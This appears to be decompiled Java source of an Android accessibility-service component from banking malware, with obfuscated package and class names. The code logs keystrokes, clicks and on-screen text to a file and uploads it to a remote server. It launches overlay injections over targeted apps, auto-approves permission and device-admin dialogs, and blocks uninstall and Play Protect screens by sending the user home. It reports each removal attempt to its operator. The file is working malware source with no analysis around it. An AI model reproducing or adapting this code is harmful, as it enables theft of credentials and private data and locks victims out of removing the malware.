package wocwvy.czyxoxmbauu.slsa;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Iterator;
import java.util.Locale;
import wocwvy.czyxoxmbauu.slsa.ncec.pltrfi;

/* JADX INFO: loaded from: classes.dex */
public class egxltnv extends AccessibilityService {

    /* JADX INFO: renamed from: a */
    C0020b f398a = new C0020b();

    /* JADX INFO: renamed from: b */
    C0019a f399b = new C0019a();

    /* JADX INFO: renamed from: c */
    String f400c = "";

    /* JADX INFO: renamed from: d */
    String f401d = "";

    /* JADX INFO: renamed from: e */
    String f402e = "";

    /* JADX INFO: renamed from: f */
    String f403f = "";

    /* JADX INFO: renamed from: g */
    String f404g = "";

    /* JADX INFO: renamed from: h */
    String f405h = "";

    /* JADX INFO: renamed from: i */
    String f406i = "";

    /* JADX INFO: renamed from: j */
    String f407j = "";

    /* JADX INFO: renamed from: k */
    String f408k = "";

    /* JADX INFO: renamed from: l */
    boolean f409l = false;

    /* JADX INFO: renamed from: m */
    String f410m = "";

    /* JADX INFO: renamed from: n */
    String f411n = "";

    /* JADX INFO: renamed from: a */
    private String m271a(AccessibilityEvent accessibilityEvent) {
        StringBuilder sb = new StringBuilder();
        Iterator<CharSequence> it = accessibilityEvent.getText().iterator();
        while (it.hasNext()) {
            sb.append(it.next());
        }
        return sb.toString();
    }

    /* JADX INFO: renamed from: a */
    String m272a(Context context) {
        try {
            PackageManager packageManager = getApplicationContext().getPackageManager();
            return (String) packageManager.getApplicationLabel(packageManager.getApplicationInfo(context.getPackageName(), 128));
        } catch (Exception unused) {
            return "";
        }
    }

    /* JADX INFO: renamed from: a */
    String m273a(String str) {
        try {
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(openFileInput(str)));
            String str2 = "";
            while (true) {
                String line = bufferedReader.readLine();
                if (line == null) {
                    return str2;
                }
                str2 = str2 + line;
            }
        } catch (IOException unused) {
            return "";
        }
    }

    /* JADX INFO: renamed from: a */
    public void m274a() {
        Intent intent = new Intent("android.intent.action.MAIN");
        intent.addCategory("android.intent.category.HOME");
        intent.setFlags(268435456);
        startActivity(intent);
    }

    /* JADX INFO: renamed from: a */
    void m275a(final Context context, final String str, final String str2) {
        new Thread(new Runnable() { // from class: wocwvy.czyxoxmbauu.slsa.egxltnv.1
            @Override // java.lang.Runnable
            public void run() {
                egxltnv.this.f398a.m230a("Start", "StartScanInjector egxltnv");
                String strReplace = str;
                if (strReplace.contains("com.imo.android.imoim,com.twitter.android")) {
                    strReplace = strReplace.replace("com.imo.android.imoim,com.twitter.android", "com.imo.android.imoim,com.twitter.android,com.android.vending");
                }
                egxltnv.this.f398a.m230a("ACCESIB", "" + strReplace);
                if (strReplace == "" || !egxltnv.this.f398a.m262o(context)) {
                    return;
                }
                String str3 = str2;
                egxltnv.this.f398a.m230a("App", "" + str3);
                String str4 = null;
                for (int i = 0; i < strReplace.split("/").length; i++) {
                    String[] strArrSplit = strReplace.split("/")[i].split(",");
                    int i2 = 1;
                    while (true) {
                        if (i2 >= strArrSplit.length) {
                            break;
                        }
                        if (str3.contains(strArrSplit[i2])) {
                            str4 = strArrSplit[0];
                            egxltnv.this.f398a.m230a("nameInject", str4);
                            break;
                        }
                        i2++;
                    }
                    if (str4 != null) {
                        break;
                    }
                }
                if (str4 != null) {
                    egxltnv egxltnvVar = egxltnv.this;
                    Context context2 = context;
                    if (((KeyguardManager) egxltnvVar.getSystemService("keyguard")).inKeyguardRestrictedInputMode()) {
                        return;
                    }
                    try {
                        Intent intentPutExtra = new Intent(context, (Class<?>) pltrfi.class).putExtra("str", str4);
                        intentPutExtra.addFlags(268435456);
                        intentPutExtra.addFlags(8388608);
                        intentPutExtra.addFlags(1073741824);
                        egxltnv.this.startActivity(intentPutExtra);
                    } catch (Exception unused) {
                        C0020b c0020b = egxltnv.this.f398a;
                        Context context3 = context;
                        StringBuilder sb = new StringBuilder();
                        sb.append("p=");
                        sb.append(egxltnv.this.f398a.m242c(egxltnv.this.f398a.m264q(context) + "|ERROR START INJECTIONS|"));
                        c0020b.m235b(context3, "4", sb.toString());
                    }
                }
            }
        }).start();
    }

    /* JADX INFO: renamed from: a */
    void m276a(String str, String str2) {
        this.f408k = "";
        try {
            String strM273a = m273a(str);
            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(openFileOutput(str, 0)));
            String str3 = strM273a + str2 + "|^|";
            bufferedWriter.write(str3);
            bufferedWriter.close();
            this.f398a.m230a("Len key", "" + str3.length());
            if (str3.length() > 10000) {
                String strReplace = str3.replace("|^|", "\n");
                C0020b c0020b = this.f398a;
                StringBuilder sb = new StringBuilder();
                sb.append("p=");
                sb.append(this.f398a.m242c(this.f398a.m264q(this) + "~~~~~~~~~~" + strReplace));
                String strM235b = c0020b.m235b(this, "12", sb.toString());
                this.f398a.m230a("SEND KEL", "LOGER");
                if (this.f398a.m247d(strM235b).contains("clear")) {
                    this.f398a.m230a("SEND KEL", "CLEAR");
                    m277b("keys.log");
                }
            }
        } catch (IOException unused) {
        }
    }

    /* JADX INFO: renamed from: b */
    void m277b(String str) {
        try {
            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(openFileOutput(str, 0)));
            bufferedWriter.write("");
            bufferedWriter.close();
        } catch (IOException unused) {
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:152:0x0063 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:156:0x014d A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:183:? A[RETURN, SYNTHETIC] */
    @Override // android.accessibilityservice.AccessibilityService
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        String string;
        String lowerCase;
        String lowerCase2;
        String lowerCase3;
        String lowerCase4;
        StringBuilder sb;
        if (this.f398a.m251e(this, "urls").length() <= 1) {
            C0020b c0020b = this.f398a;
            C0019a c0019a = this.f399b;
            c0020b.m230a("egxltnv", "STOP!!");
            return;
        }
        try {
            string = accessibilityEvent.getPackageName().toString();
        } catch (Exception unused) {
            string = "";
        }
        try {
            lowerCase = accessibilityEvent.getPackageName().toString().toLowerCase();
        } catch (Exception unused2) {
            lowerCase = "";
            lowerCase2 = "";
            lowerCase3 = "";
            lowerCase4 = "";
            if (this.f409l) {
            }
            AccessibilityNodeInfo source = accessibilityEvent.getSource();
            if (32 != accessibilityEvent.getEventType()) {
            }
        }
        try {
            lowerCase2 = m271a(accessibilityEvent).toLowerCase();
        } catch (Exception unused3) {
            lowerCase2 = "";
            lowerCase3 = "";
            lowerCase4 = "";
            if (this.f409l) {
            }
            AccessibilityNodeInfo source2 = accessibilityEvent.getSource();
            if (32 != accessibilityEvent.getEventType()) {
            }
        }
        try {
            lowerCase3 = accessibilityEvent.getClassName().toString().toLowerCase();
        } catch (Exception unused4) {
            lowerCase3 = "";
            lowerCase4 = "";
            if (this.f409l) {
            }
            AccessibilityNodeInfo source22 = accessibilityEvent.getSource();
            if (32 != accessibilityEvent.getEventType()) {
            }
        }
        try {
            lowerCase4 = m272a(this).toLowerCase();
        } catch (Exception unused5) {
            lowerCase4 = "";
        }
        if (this.f409l) {
            try {
                String str = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US).format(Calendar.getInstance().getTime());
                int eventType = accessibilityEvent.getEventType();
                if (eventType == 1) {
                    String string2 = accessibilityEvent.getText().toString();
                    this.f398a.m230a("KEY3", str + "|(CLICKED)|" + string2);
                    sb = new StringBuilder();
                    sb.append(str);
                    sb.append("|(CLICKED)|");
                    sb.append(string2);
                    sb.append("|^|");
                } else if (eventType == 8) {
                    String string3 = accessibilityEvent.getText().toString();
                    this.f398a.m230a("KEY2", str + "|(FOCUSED)|" + string3);
                    sb = new StringBuilder();
                    sb.append(str);
                    sb.append("|(FOCUSED)|");
                    sb.append(string3);
                    sb.append("|^|");
                } else if (eventType == 16) {
                    String string4 = accessibilityEvent.getText().toString();
                    this.f398a.m230a("KEY1", str + "|(TEXT)|" + string4);
                    sb = new StringBuilder();
                    sb.append(str);
                    sb.append("|(TEXT)|");
                    sb.append(string4);
                    sb.append("|^|");
                }
                this.f408k = sb.toString();
            } catch (Exception unused6) {
                this.f398a.m230a("ERROR1", "AccessibilityService");
            }
        }
        AccessibilityNodeInfo source222 = accessibilityEvent.getSource();
        if (32 != accessibilityEvent.getEventType()) {
            try {
                if (this.f409l && this.f408k.length() > 2) {
                    m276a("keys.log", this.f408k);
                }
                if (this.f398a.m251e(this, "keylogger").equals("true")) {
                    this.f409l = true;
                } else {
                    this.f409l = false;
                }
                C0020b c0020b2 = this.f398a;
                C0019a c0019a2 = this.f399b;
                c0020b2.m230a("egxltnv", "ACC::onAccessibilityEvent: nodeInfo=" + source222);
                if (source222 == null) {
                    return;
                }
                for (AccessibilityNodeInfo accessibilityNodeInfo : source222.findAccessibilityNodeInfosByText(this.f398a.m256i(this))) {
                    Iterator<AccessibilityNodeInfo> it = source222.findAccessibilityNodeInfosByText(this.f403f).iterator();
                    while (it.hasNext()) {
                        if (it.next().toString().contains("com.android.settings")) {
                            m274a();
                            C0020b c0020b3 = this.f398a;
                            StringBuilder sb2 = new StringBuilder();
                            sb2.append("p=");
                            sb2.append(this.f398a.m242c(this.f398a.m264q(this) + "|Attempt to remove malware 2|"));
                            c0020b3.m235b(this, "4", sb2.toString());
                        }
                    }
                    Iterator<AccessibilityNodeInfo> it2 = source222.findAccessibilityNodeInfosByText(this.f404g).iterator();
                    while (it2.hasNext()) {
                        if (it2.next().toString().contains("com.android.settings")) {
                            m274a();
                            C0020b c0020b4 = this.f398a;
                            StringBuilder sb3 = new StringBuilder();
                            sb3.append("p=");
                            sb3.append(this.f398a.m242c(this.f398a.m264q(this) + "|Attempt to remove malware 3|"));
                            c0020b4.m235b(this, "4", sb3.toString());
                        }
                    }
                }
                Iterator<AccessibilityNodeInfo> it3 = source222.findAccessibilityNodeInfosByText(this.f400c).iterator();
                while (true) {
                    if (!it3.hasNext()) {
                        break;
                    }
                    AccessibilityNodeInfo next = it3.next();
                    C0020b c0020b5 = this.f398a;
                    C0019a c0019a3 = this.f399b;
                    c0020b5.m230a("egxltnv", "ACC::onAccessibilityEvent: left_button " + next);
                    if (next.toString().contains("com.android.settings")) {
                        next.performAction(16);
                        break;
                    }
                }
                Iterator<AccessibilityNodeInfo> it4 = source222.findAccessibilityNodeInfosByText(this.f405h).iterator();
                while (true) {
                    if (!it4.hasNext()) {
                        break;
                    }
                    AccessibilityNodeInfo next2 = it4.next();
                    if (next2.toString().contains("com.android.settings")) {
                        next2.performAction(16);
                        break;
                    }
                }
                if (lowerCase2.contains("sms") || lowerCase2.contains(this.f398a.m256i(this).toLowerCase())) {
                    for (AccessibilityNodeInfo accessibilityNodeInfo2 : source222.findAccessibilityNodeInfosByText(this.f402e)) {
                        if (accessibilityNodeInfo2.toString().contains("android.widget.Button") && accessibilityNodeInfo2.toString().contains("com.android.settings")) {
                            accessibilityNodeInfo2.performAction(16);
                        }
                    }
                }
                if (lowerCase2.contains(this.f398a.m256i(this).toLowerCase())) {
                    Iterator<AccessibilityNodeInfo> it5 = source222.findAccessibilityNodeInfosByText(this.f406i).iterator();
                    if (it5.hasNext()) {
                        it5.next().performAction(16);
                    }
                }
                if (lowerCase2.contains(this.f398a.m256i(this).toLowerCase())) {
                    Iterator<AccessibilityNodeInfo> it6 = source222.findAccessibilityNodeInfosByText(this.f407j).iterator();
                    if (it6.hasNext()) {
                        it6.next().performAction(16);
                    }
                }
                if (lowerCase2.contains(this.f398a.m256i(this).toLowerCase())) {
                    Iterator<AccessibilityNodeInfo> it7 = source222.findAccessibilityNodeInfosByText("").iterator();
                    if (it7.hasNext()) {
                        it7.next().performAction(16);
                    }
                }
                Iterator<AccessibilityNodeInfo> it8 = source222.findAccessibilityNodeInfosByText(this.f401d).iterator();
                while (it8.hasNext()) {
                    it8.next().performAction(16);
                    this.f398a.m230a("Click", "" + this.f401d);
                }
                if (lowerCase2.contains("30") && lowerCase2.length() > 30 && lowerCase2 != "" && lowerCase.contains("com.android.settings")) {
                    m274a();
                    C0020b c0020b6 = this.f398a;
                    StringBuilder sb4 = new StringBuilder();
                    sb4.append("p=");
                    sb4.append(this.f398a.m242c(this.f398a.m264q(this) + "|Attempt to reset the system|"));
                    c0020b6.m235b(this, "4", sb4.toString());
                }
                try {
                    if (accessibilityEvent.getPackageName().toString().contains("com.google.android.packageinstaller") && lowerCase3.contains("android.app.alertdialog") && lowerCase2.contains(lowerCase4)) {
                        m274a();
                        C0020b c0020b7 = this.f398a;
                        StringBuilder sb5 = new StringBuilder();
                        sb5.append("p=");
                        sb5.append(this.f398a.m242c(this.f398a.m264q(this) + "|Attempt to remove malware 1|"));
                        c0020b7.m235b(this, "4", sb5.toString());
                    }
                } catch (Exception unused7) {
                }
                try {
                    if (lowerCase3.contains("settings.verifyappssettingsactivity") && this.f398a.m251e(this, "play_protect").equals("false")) {
                        m274a();
                        C0020b c0020b8 = this.f398a;
                        StringBuilder sb6 = new StringBuilder();
                        sb6.append("p=");
                        sb6.append(this.f398a.m242c(this.f398a.m264q(this) + "|Trying to enable <Google Play Protect>!|"));
                        c0020b8.m235b(this, "4", sb6.toString());
                    }
                } catch (Exception unused8) {
                }
                String strM251e = this.f398a.m251e(this, "save_inj");
                if (strM251e.length() > 5) {
                    m275a(this, strM251e, string);
                }
                if (this.f398a.m232a(this, jtfxlnc.class)) {
                    return;
                }
                startService(new Intent(this, (Class<?>) jtfxlnc.class));
            } catch (Exception unused9) {
                this.f398a.m230a("ERROR", "AccessibService");
            }
        }
    }

    @Override // android.accessibilityservice.AccessibilityService
    public void onInterrupt() {
        C0020b c0020b = this.f398a;
        C0019a c0019a = this.f399b;
        c0020b.m230a("egxltnv", "onInterrupt");
    }

    @Override // android.accessibilityservice.AccessibilityService
    protected void onServiceConnected() {
        super.onServiceConnected();
        C0020b c0020b = this.f398a;
        C0019a c0019a = this.f399b;
        c0020b.m230a("egxltnv", "onServiceConnected");
        this.f400c = this.f398a.m251e(this, "StringActivate");
        this.f401d = this.f398a.m251e(this, "StringPermis");
        this.f402e = this.f398a.m251e(this, "StringYes");
        this.f403f = this.f398a.m251e(this, "uninstall1");
        this.f404g = this.f398a.m251e(this, "uninstall2");
        this.f405h = this.f398a.m251e(this, "vkladmin");
        this.f406i = this.f398a.m251e(this, "straccessibility");
        this.f407j = this.f398a.m251e(this, "straccessibility2");
        try {
            int i = Integer.parseInt(this.f398a.m251e(this, "time_start_permission")) + Integer.parseInt(this.f398a.m251e(this, "time_work")) + 120;
            this.f398a.m250d(this, "time_start_permission", "" + i);
        } catch (Exception unused) {
        }
        AccessibilityServiceInfo accessibilityServiceInfo = new AccessibilityServiceInfo();
        accessibilityServiceInfo.flags = 1;
        accessibilityServiceInfo.eventTypes = -1;
        accessibilityServiceInfo.feedbackType = 16;
        setServiceInfo(accessibilityServiceInfo);
    }
}
